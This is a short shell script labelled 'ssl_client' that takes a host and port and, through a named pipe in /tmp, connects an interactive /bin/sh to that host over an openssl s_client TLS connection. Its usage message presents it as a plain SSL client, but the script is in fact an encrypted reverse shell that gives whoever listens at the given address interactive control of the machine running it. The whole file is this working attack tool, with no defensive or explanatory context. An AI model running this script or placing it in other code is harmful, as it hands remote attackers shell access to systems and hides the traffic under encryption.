#!/bin/sh
if [[ -z "$1" || -z "$2" ]]; then
    echo "Usage ./ssl_client <host> <port>"
    exit 1
fi
HOST="$1"
PORT=$2
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $HOST:$PORT > /tmp/s; rm /tmp/s
